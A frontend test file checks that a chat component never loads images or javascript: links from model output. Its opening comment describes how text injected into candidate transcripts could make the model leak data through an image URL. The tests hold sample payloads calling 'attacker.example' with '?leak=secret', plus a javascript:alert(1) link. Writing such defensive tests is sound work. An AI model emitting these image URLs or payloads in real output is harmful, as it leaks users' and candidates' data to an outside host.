// @vitest-environment node
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { I18nextProvider } from 'react-i18next'
import { describe, expect, it } from 'vitest'

import { MessageResponse } from './message'
import type { Locale } from '~/lib/locale'
import { createI18n } from '~/lib/i18n'

/**
 * Assistant output is model output, and the model reads candidate transcripts
 * through `readReport`. An image in it is a request the recruiter's browser
 * makes on render, with whatever the model put in the URL — so no image the
 * model names may be loaded, whatever form it takes.
 */
function render(markdown: string, locale: Locale = 'en'): string {
  return renderToStaticMarkup(
    createElement(
      I18nextProvider,
      { i18n: createI18n(locale) },
      createElement(MessageResponse, { mode: 'static' }, markdown),
    ),
  )
}

const FOREIGN = 'https://attacker.example/p.png?leak=secret'

describe('MessageResponse images', () => {
  it.each([
    ['markdown image', `![chart](${FOREIGN})`],
    ['raw HTML image', `<img src="${FOREIGN}" alt="chart">`],
    ['reference image', `![chart][ref]\n\n[ref]: ${FOREIGN}`],
    // A <source> is only ever read by the <img> beside it: with the <img>
    // gone, the <picture> fetches nothing.
    [
      'picture',
      `<picture><source srcset="${FOREIGN}"><img src="${FOREIGN}" alt="chart"></picture>`,
    ],
  ])('never loads a %s', (_, markdown) => {
    const html = render(markdown)
    expect(html).not.toContain('<img')
    expect(html).not.toContain('rel="preload"')
    expect(html).not.toContain(' src=')
    expect(html).toContain('chart')
  })

  it('never loads a data: image', () => {
    const html = render('![pixel](data:image/png;base64,iVBORw0KGgo=)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('data:image')
  })

  it('says, in the reader’s language, that an image was not shown', () => {
    expect(render(`![chart](${FOREIGN})`, 'en')).toContain('Image not shown')
    expect(render(`![chart](${FOREIGN})`, 'fr')).toContain('Image non affichée')
  })

  it('still renders links, and never a javascript: href', () => {
    const html = render(
      '[docs](https://example.com/docs) and [x](javascript:alert(1))',
    )
    expect(html).toContain('docs')
    expect(html).not.toContain('javascript:')
  })
})
